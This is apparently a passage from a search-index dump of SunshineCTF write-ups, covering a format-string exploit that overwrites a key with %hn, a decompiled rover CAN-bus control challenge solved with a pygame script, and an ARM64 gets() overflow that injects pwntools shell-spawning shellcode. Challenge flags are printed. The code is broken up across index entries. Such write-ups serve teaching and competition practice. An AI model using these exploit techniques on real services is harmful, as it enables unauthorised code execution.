own risk: %p%p%p%p%p%p%p%p         0x110xc(nil)(nil)0x70257025702570250x70257025702570250xa(nil)         At and after the fifth parameter the format string is representing the parameter.So to write 0x1337C0DE we can do the following:             1. write 0x1337 chars             2. write the number of printed chars (which is exactly 0x1337) to the       address specified by 7th parameter (starting from &amp;buf[16]).             3. place the address 0x404012 to where the 7th parameter resides.</p> <p>Now all we need to do is write a python code using pwn tools to get the key at 0x404010 and  write 0x1337C0DE with 0x404012 to get the flag!</p> <p>Code:</p> <p>from pwn import *</p> <p>elf = ELF(\"./jupiter\") context.binary = elf context.terminal = [\"tmux\", \"split-w\", \"-h\"] context(arch=\"amd64\", os=\"linux\", log_level=\"debug\") ```python</p>"},{"location":"writeups/sunshine-ctf/#secret_key-at-0x404010","title":"secret_key at 0x404010","text":""},{"location":"writeups/sunshine-ctf/#0x0badc0de-0x1337c0de","title":"0x0BADC0DE -&gt; 0x1337C0DE","text":""},{"location":"writeups/sunshine-ctf/#write-0x1337-to-0x404012","title":"write 0x1337 to 0x404012","text":"<p>p = remote(\"chal.sunshinectf.games\", 25607)</p>"},{"location":"writeups/sunshine-ctf/#runs-jupiter","title":"runs ./jupiter","text":""},{"location":"writeups/sunshine-ctf/#gdbattachp","title":"gdb.attach(p)","text":""},{"location":"writeups/sunshine-ctf/#pause","title":"pause()","text":"<p>p.sendline(f\"%{0x1337}c%7$hn\".encode() + b\"A\" * 5 + p64(0x404012)) p.interactive()</p> <p>Flag:sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}</p>"},{"location":"writeups/sunshine-ctf/#writeup-no6-re-space-race","title":"Writeup No.6 :(Re) Space Race","text":"<p>No this one was a medium level chal but a lot of reading and disection of the code is required.</p> <p>The question was:                 NASA was so excited to send their new unmanned rover out to pick up some stranded astronauts that they forgot to actually write the software to control it. Can you take a look at the onboard ECU software and see if you can find a way to establish communications?</p> <pre><code>            If worse comes to worst, maybe they CAN BUS the astronauts back....\n\n                the server binary has been updated to not be stripped\n\n            nc chal.sunshinectf.games 25102\n\n    Lets first start by decompiling using Ghidra:\n</code></pre> <p>```c         while ( 1 )         {         v58 = bufio__ptr_Reader_ReadBytes(&amp;b, 0xAu);         if ( v58._r1.tab )             break;         v32 = v58._r0.cap;         v31 = v58._r0.len;         v40.array = v58._r0.array;         p_main_ControlMsg = (main_ControlMsg )runtime_newobject((runtime__type_1 )&amp;RTYPE_main_ControlMsg);         v = (main_ControlMsg_0 )p_main_ControlMsg;         p_main_ControlMsg-&gt;T.ptr = 0;         p_main_ControlMsg-&gt;Frame.ptr = 0;         v66.len = v31;         v66.cap = v32;         v66.array = v40.array;         v67 = main_trim(v66);         v55._type = (runtime__type_0 )&amp;RTYPE__ptr_main_ControlMsg;         v55.data = v;         if ( !(unsigned __int64)encoding_json_Unmarshal(v67, v55).tab )         {             str = v-&gt;T.str;             if ( v-&gt;T.len == 3 &amp;&amp; (_WORD )str == 0x6163 &amp;&amp; str[2] == 110 )             {             v65.len = v-&gt;Frame.len;             if ( v65.len )             {                 v65.str = v-&gt;Frame.str;                 v68 = runtime_stringtoslicebyte((runtime_tmpBuf )buf, v65);                 raw_array = v68.array;                 v30 = v68.cap;                 v9 = (unsigned __int128)encoding_hex_Decode(v68, v68);                 if ( (unsigned __int64)v9 &gt; v30 )                 runtime_panicSliceAcap();                 if ( !((_QWORD )&amp;v9 + 1) &amp;&amp; (__int64)v9 &gt;= 3 )                 {                 v10 = raw_array;                 v11 = (_WORD )raw_array;                 v12 = raw_array[2] &amp; 0xF;                 if ( (unsigned __int64)v12 &lt;= 8 &amp;&amp; (__int64)v9 &gt;= v12 + 3 )                 {                     if ( (unsigned __int64)(v12 + 3) &lt; 3 )                     runtime_panicSliceB();                     v13 = rover;                     v14 = ((__int64)(3 - v30) &gt;&gt; 63) &amp; 3;                     v15 = &amp;raw_array[v14];                     if ( _InterlockedCompareExchange((volatile signed __int32 )&amp;rover-&gt;mu, 1, 0) )                     {                     dlc = v12;                     v36 = v14;                     v40.len = (int)&amp;v10[v14];                     v29 = v11;                     sync__ptr_Mutex_lockSlow(&amp;v13-&gt;mu);                     v13 = rover;                     v14 = v36;                     v10 = raw_array;                     v11 = v29;                     v12 = dlc;                     v15 = (uint8 )v40.len;                     }                     v16 = ROL2(v11, 8) &amp; 0x7FF;                     if ( v16 &gt; 0x202u )                     {                     switch ( v16 )                     {                         case 0x203u:                         v13-&gt;vel = v13-&gt;vel * 0.65;                         v13-&gt;msg.len = 6;                         if ( (_DWORD )&amp;runtime_writeBarrier.enabled )                             goto LABEL_58;                         v13-&gt;msg.str = (uint8 )\"Brake!\";                         break;                         case 0x204u:                         v13-&gt;steerPct = 0;                         v13-&gt;heading = v13-&gt;heading * 0.9;                         v13-&gt;msg.len = 14;                         if ( !(_DWORD )&amp;runtime_writeBarrier.enabled )                         {                             v13-&gt;msg.str = (uint8 )\"Stabilizers on\";                             break;                         }         L_58:                         runtime_gcWriteBarrierDX();                         break;                         case 0x205u:                         if ( v13-&gt;status.len != 2 || (_WORD )v13-&gt;status.str != 27503 )                         {                             v13-&gt;s = 0.0;                             v13-&gt;x = 0.0;                             v13-&gt;vel = 0.0;                             (_OWORD )&amp;v13-&gt;throttlePct = 0;                             v13-&gt;status.len = 2;                             if ( (_DWORD )&amp;runtime_writeBarrier.enabled )                             runtime_gcWriteBarrierDX();                             else                             v13-&gt;status.str = (uint8 )\"ok\";                             v13-&gt;msg.len = 14;                             if ( (_DWORD )&amp;runtime_writeBarrier.enabled )                             runtime_gcWriteBarrierSI();                             else                             v13-&gt;msg.str = (uint8 )\"Reset to start\";                         }                         break;                         default:         L_73:                         a = 0;                         v23 = runtime_convT16(v16);                         (_QWORD )&amp;a = &amp;RTYPE_uint16;                         ((_QWORD )&amp;a + 1) = v23;                         v61.str = (uint8 )\"Unknown CAN 0x%03X\";                         v61.len = 18;                         v64.len = 1;                         v64.cap = 1;                         v64.array = (interface__0 )&amp;a;                         v24 = fmt_Sprintf(v61, v64);                         v13 = rover;                         rover-&gt;msg.len = v24.len;                         if ( (_DWORD )&amp;runtime_writeBarrier.enabled )                             runtime_gcWriteBarrier();                         else                             v13-&gt;msg.str = v24.str;                         break;                     }                     }                     else if ( v16 == 513 )                     {                     if ( v12 &gt;= 1 )                     {                         v17 = v10[v14];                         if ( v17 &gt; 100 )                         v17 = 100;                         v13-&gt;throttlePct = v17;                         a = 0;                         v18 = runtime_convT64(v13-&gt;throttlePct);                         (_QWORD )&amp;a = &amp;RTYPE_int;                         ((_QWORD )&amp;a + 1) = v18;                         v59.str = (uint8 )\"Throttle %d%%\";                         v59.len = 13;                         v62.len = 1;                         v62.cap = 1;                         v62.array = (interface__0 )&amp;a;                         v19 = fmt_Sprintf(v59, v62);                         v13 = rover;                         rover-&gt;msg.len = v19.len;                         if ( (_DWORD )&amp;runtime_writeBarrier.enabled )                         runtime_gcWriteBarrier();                         else                         v13-&gt;msg.str = v19.str;                     }                     }                     else                     {                     if ( v16 != 514 )                         goto LABEL_73;                     if ( v12 &gt;= 1 )                     {                         v20 = (char)v15;                         if ( v20 &gt;= -100 )                         {                         if ( v20 &gt; 100 )                             v20 = 100;                         }                         else                         {                         v20 = -100;                         }                         v13-&gt;steerPct = v20;                         a = 0;                         v21 = runtime_convT64(v13-&gt;steerPct);                         (_QWORD )&amp;a = &amp;RTYPE_int;                         ((_QWORD )&amp;a + 1) = v21;                         v60.str = (uint8 )\"Steer %d%%\";                         v60.len = 10;                         v63.len = 1;                         v63.cap = 1;                         v63.array = (interface__0 )&amp;a;                         v22 = fmt_Sprintf(v60, v63);                         v13 = rover;                         rover-&gt;msg.len = v22.len;                         if ( (_DWORD )&amp;runtime_writeBarrier.enabled )                         runtime_gcWriteBarrier();                         else                         v13-&gt;msg.str = v22.str;                     }                     }                     v25 = _InterlockedExchangeAdd((volatile signed __int32 *)&amp;v13-&gt;mu, 0xFFFFFFFF);                     if ( v25 != 1 )                     sync__ptr_Mutex_unlockSlow(&amp;v13-&gt;mu, v25 - 1);                 }                 }             }             }         }         } There's a lot to uncover from here on. It kinda looks like a game like astroid busters and might need a bit help with the controls part. We can see a lot of things like:     1. 2 bytes of op code     2. 1 byte of payload length     3. variable length of payload So now we need to assign opcodes with necessary functions to make it playable and retrieve the flag! Possible options we have:</p> <ol> <li>0202: steer with one argument, -100 to 100</li> <li>0203: brake</li> <li>0204: stablizer</li> <li>0201: throttle with one argument, 0 to 100</li> </ol> <p>Now just map the opcodes to keyboard input(Used a bit of gpt!):</p> <pre><code>    elif e.key == pygame.K_LEFT:\n        # -100\n        net.sock.send((json.dumps({\n            \"t\": \"can\",\n            \"frame\": \"0202019c\"\n        }) + \"\\n\").encode())\n    elif e.key == pygame.K_RIGHT:\n        # +100\n        net.sock.send((json.dumps({\n            \"t\": \"can\",\n            \"frame\": \"02020164\"\n        }) + \"\\n\").encode())\n    elif e.key == pygame.K_b:\n        # brake\n        net.sock.send((json.dumps({\n            \"t\": \"can\",\n            \"frame\": \"020300\"\n        }) + \"\\n\").encode())\n    elif e.key == pygame.K_s:\n        # stablizer\n        net.sock.send((json.dumps({\n            \"t\": \"can\",\n            \"frame\": \"020400\"\n        }) + \"\\n\").encode())\n    elif e.key == pygame.K_r:\n        # throttle\n        net.sock.send((json.dumps({\n            \"t\": \"can\",\n            \"frame\": \"02010164\"\n        }) + \"\\n\").encode())\n    print(e.key)\n</code></pre> <p>Then initiate the game by pressing r and ude Left/Right to avoid obstacles.After completing it we get the flag: sun{r3d_r0v3r_c0m3_0v3r}</p>"},{"location":"writeups/sunshine-ctf/#writeup-no7-i95-daytona","title":"Writeup No.7 :(i95) Daytona","text":"<p>This challenge was a good one. The question was:         Cops don't like it when you drive like you're in the Daytona 500 :/</p> <pre><code>        daytona\n\n    nc chal.sunshinectf.games 25606\n</code></pre> <p>Start by decompiling the code in Ghidra:</p> <pre><code>    void vuln(void)\n    {\n    undefined1 auStack_b5 [101];\n    char local_40 [64];\n\n    // zeroing omitted\n    printf(\"The cops said I was going %llu MPH over the speedlimit :(\\nWhat do I tell them??\\n\",\n            auStack_b5);\n    gets(local_40);\n    return;\n    }\n</code></pre> <p>We can see that it leeks adress from somewhere. \"maybe the stack adress?\" is what I thought and then examined the stack frame and in the function  vul in sp we see that:</p> <ol> <li>sp+0x00 to sp+0x10: saved x29 and x30</li> <li>sp+0x10: gets buffer is here</li> </ol> <p>Hence we cannot override he return adress from vuln. BUT we can from main</p> <p>\"sp+0x50 to sp+0x60: saved x29 and x30 for main\"</p> <p>So I could may be override the sp+0x58 to somewhere else in the stack. So I put the shellcode generated by pwntools there to get shell: ```python from pwn import *</p> <p>elf = ELF(\"./daytona\") context.binary = elf context.terminal = [\"tmux\", \"split-w\", \"-h\"] context(arch=\"arm64\", os=\"linux\", log_level=\"debug\")</p> <p>p = remote(\"chal.sunshinectf.games\", 25606)</p>"},{"location":"writeups/sunshine-ctf/#runs-daytona","title":"runs ./daytona","text":"<p>line = p.recvline().decode() addr = int(line.split()[6]) sp = addr + 0x65</p>"},{"location":"writeups/sunshine-ctf/#sp0x00-to-sp0x10-saved-x29-and-x30","title":"sp+0x00 to sp+0x10: saved x29 and x30","text":""},{"location":"writeups/sunshine-ctf/#sp0x10-gets-buffer","title":"sp+0x10: gets buffer","text":""},{"location":"writeups/sunshine-ctf/#sp0x50-to-sp0x60-saved-x29-and-x30-for-main","title":"sp+0x50 to sp+0x60: saved x29 and x30 for main","text":""},{"location":"writeups/sunshine-ctf/#override-sp0x58-to-jump-to-shellcode-on-stack","title":"override sp+0x58 to jump to shellcode on stack","text":""},{"location":"writeups/sunshine-ctf/#put-shellcode-at-sp0x60","title":"put shellcode at sp+0x60","text":"<p>shellcode = shellcraft.sh() print(shellcode)</p>"},{"location":"writeups/sunshine-ctf/#gdbattachp_1","title":"gdb.attach(p)","text":""},{"location":"writeups/sunshine-ctf/#pause_1","title":"pause()","text":""},{"location":"writeups/sunshine-ctf/#gets-buffer-is-at-sp0x10very-imp","title":"gets buffer is at sp+0x10(very imp)","text":"<p>p.sendline(b\"A\" * 0x48 + p64(sp+0x60) + asm(shellcode)) p.interactive()</p> <p>This will print out the flag: sun{ARM64_shEl1c0de_!s_pr3ttY_n3a7_dOnT_y0u_thInk?}</p>"}]}